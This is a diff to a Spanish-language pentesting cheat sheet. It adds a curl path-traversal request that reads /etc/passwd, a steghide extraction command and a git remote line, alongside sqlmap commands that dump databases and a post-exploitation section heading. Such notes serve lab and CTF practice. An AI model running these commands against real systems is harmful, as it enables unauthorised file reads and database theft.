@@ -61,6 +61,10 @@ curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]
 
 curl -T archivo (ip/dir/archivo) --http1.0 [sirve para subir un archivo a un servidor web usando el método HTTP PUT bajo la versión HTTP/1.0]
 
+curl -X POST -k http://ip/archivo.php -d "parametro=../../../../../etc/passwd" [lee /etc/passwd con una traversal (../../..) en archivo.php]
+
+
+
 sqlmap -r (archivo.sql) --dbs [ejecuta un ataque de inyección SQL usando una petición HTTP guardada en el archivo archivo.sql para detectar y listar las bases de datos del servidor objetivo]
 
 sqlmap -r (archivo.sql) -D (USUARIOS) --dump-all [extrae y muestra todo el contenido de todas las tablas dentro de la base de datos llamada por ejemplo USUARIOS, usando la petición HTTP del archivo archivo.sql]
@@ -181,6 +185,8 @@ binwalk -e (archivo ) [escanea un archivo binario en busca de datos incrustados 
 strings (archivo) [extrae las cadenas de texto de un archivo]
 
 stegcracker (archivo de imagen) (RutaDeWordlist) [analiza imágenes y busca posibles mensajes o archivos escondidos dentro de ellas]
+
+steghide extract -sf (imagen) [intenta extraer datos ocultos dentro de la imagen usando steganografía]
 
 
 8. post explotacion y escalada de privilegios:
@@ -432,6 +438,8 @@ git submodule [Gestiona submódulos Git, es decir, repositorios dentro de otros 
 git config --global user.name "Tu Nombre" [Configura el nombre de usuario global]
 
 git config --global user.email "tu.email@dominio.com" [Configura el correo electrónico global]
+
+git remote set-url origin git@github.com:usuario/nombreRepositorio.git
 
 git branch <nombre-rama> [Crea una nueva rama]
 
